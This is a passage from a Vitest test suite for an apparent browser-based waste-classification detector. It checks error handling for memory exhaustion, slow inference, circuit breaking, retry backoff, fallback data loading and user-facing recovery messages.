      const degradedConfig = errorBoundary.createDegradedConfiguration(limitedCapabilities);
      
      expect(degradedConfig.executionProviders).toEqual(['cpu']);
      expect(degradedConfig.enableLLM).toBe(false);
      expect(degradedConfig.enableEnsemble).toBe(false);
      expect(degradedConfig.inputResolution).toEqual([320, 320]); // Reduced for performance
    });
  });

  describe('Memory and Performance Error Handling', () => {
    test('handles memory exhaustion gracefully', async () => {
      // Mock memory exhaustion
      const mockSession = {
        run: vi.fn().mockRejectedValue(new Error('JavaScript heap out of memory')),
        release: vi.fn()
      };

      const ort = await import('onnxruntime-web');
      vi.mocked(ort.InferenceSession.create).mockResolvedValue(mockSession as any);

      await detector.initialize();
      
      // Should handle memory issues
      const result = await detector.detect(new ImageData(640, 640));
      expect(Array.isArray(result)).toBe(true);
      
      // Should suggest memory optimization
      expect(console.warn).toHaveBeenCalledWith(
        expect.stringContaining('memory')
      );
    });

    test('handles performance degradation', async () => {
      // Mock slow inference
      const slowSession = {
        run: vi.fn().mockImplementation(() => 
          new Promise(resolve => setTimeout(() => resolve({
            output0: { data: new Float32Array(84), dims: [1, 84, 1] }
          }), 5000)) // 5 second delay
        ),
        release: vi.fn()
      };

      const ort = await import('onnxruntime-web');
      vi.mocked(ort.InferenceSession.create).mockResolvedValue(slowSession as any);

      await detector.initialize();
      
      const startTime = Date.now();
      const result = await detector.detect(new ImageData(640, 640));
      const duration = Date.now() - startTime;
      
      // Should either timeout or complete
      expect(Array.isArray(result)).toBe(true);
      
      if (duration > 3000) {
        // Should log performance warning
        expect(console.warn).toHaveBeenCalledWith(
          expect.stringContaining('performance')
        );
      }
    });
  });

  describe('Error Recovery Mechanisms', () => {
    test('implements circuit breaker pattern', async () => {
      const circuitBreaker = errorRecovery.createCircuitBreaker(3, 1000); // 3 failures, 1s timeout
      
      // Mock failing operation
      const failingOperation = vi.fn().mockRejectedValue(new Error('Operation failed'));
      
      // Should fail 3 times then open circuit
      for (let i = 0; i < 5; i++) {
        try {
          await circuitBreaker.execute(failingOperation);
        } catch (error) {
          // Expected to fail
        }
      }
      
      expect(circuitBreaker.state).toBe('open');
      expect(failingOperation).toHaveBeenCalledTimes(3); // Should stop calling after 3 failures
    });

    test('implements exponential backoff retry', async () => {
      let attemptCount = 0;
      const retryOperation = vi.fn().mockImplementation(() => {
        attemptCount++;
        if (attemptCount < 4) {
          return Promise.reject(new Error(`Attempt ${attemptCount} failed`));
        }
        return Promise.resolve('success');
      });

      const retryHandler = errorRecovery.createRetryHandler(5, 100, 2); // 5 retries, 100ms base, 2x backoff
      const startTime = Date.now();
      
      const result = await retryHandler.execute(retryOperation);
      const duration = Date.now() - startTime;
      
      expect(result).toBe('success');
      expect(attemptCount).toBe(4);
      
      // Should implement exponential backoff (100 + 200 + 400 = 700ms minimum)
      expect(duration).toBeGreaterThan(700);
    });

    test('provides fallback data sources', async () => {
      // Mock primary data source failure
      vi.mocked(global.fetch).mockRejectedValue(new Error('Primary source failed'));
      
      // Should try fallback sources
      const fallbackSources = [
        '/data/wasteData.json',
        '/data/wasteData-backup.json',
        '/data/wasteData-minimal.json'
      ];
      
      const dataLoader = errorRecovery.createFallbackLoader(fallbackSources);
      
      // Mock only the last source succeeding
      vi.mocked(global.fetch).mockImplementation((url) => {
        if (url === '/data/wasteData-minimal.json') {
          return Promise.resolve({
            ok: true,
            json: () => Promise.resolve({ classifications: {}, keywords: {} })
          } as any);
        }
        return Promise.reject(new Error('Source not available'));
      });
      
      const result = await dataLoader.load();
      expect(result).toBeDefined();
      expect(global.fetch).toHaveBeenCalledTimes(3); // Should try all sources
    });
  });

  describe('User Experience During Errors', () => {
    test('provides helpful error messages', () => {
      const errorMessages = errorBoundary.generateUserFriendlyErrors();
      
      // Should have user-friendly messages for common errors
      expect(errorMessages['Permission denied']).toContain('camera access');
      expect(errorMessages['Network error']).toContain('internet connection');
      expect(errorMessages['Out of memory']).toContain('close some tabs');
      expect(errorMessages['WebGL context lost']).toContain('refresh');
      
      // Should provide actionable advice
      Object.values(errorMessages).forEach(message => {
        expect(message).toMatch(/try|enable|check|refresh|close/i);
      });
    });

    test('maintains partial functionality during errors', async () => {
      // Mock LLM failure but keep basic detection
      global.Worker = vi.fn().mockImplementation(() => {
        throw new Error('Worker not supported');
      });

      await detector.initialize();
      const result = await detector.detect(new ImageData(640, 640));
      
      // Should still work without LLM enhancement
      expect(Array.isArray(result)).toBe(true);
      
      // Should inform user about reduced functionality
      expect(console.warn).toHaveBeenCalledWith(
        expect.stringContaining('LLM')
      );
    });

    test('provides recovery suggestions', () => {
      const recoverySuggestions = errorBoundary.getRecoverySuggestions();
      
      expect(recoverySuggestions).toHaveProperty('memoryIssues');
      expect(recoverySuggestions).toHaveProperty('networkIssues');
      expect(recoverySuggestions).toHaveProperty('browserCompatibility');
      expect(recoverySuggestions).toHaveProperty('performanceIssues');
      
      // Each suggestion should have steps
      Object.values(recoverySuggestions).forEach((suggestion: any) => {
        expect(Array.isArray(suggestion.steps)).toBe(true);
        expect(suggestion.steps.length).toBeGreaterThan(0);
      });
    });
  });
}); 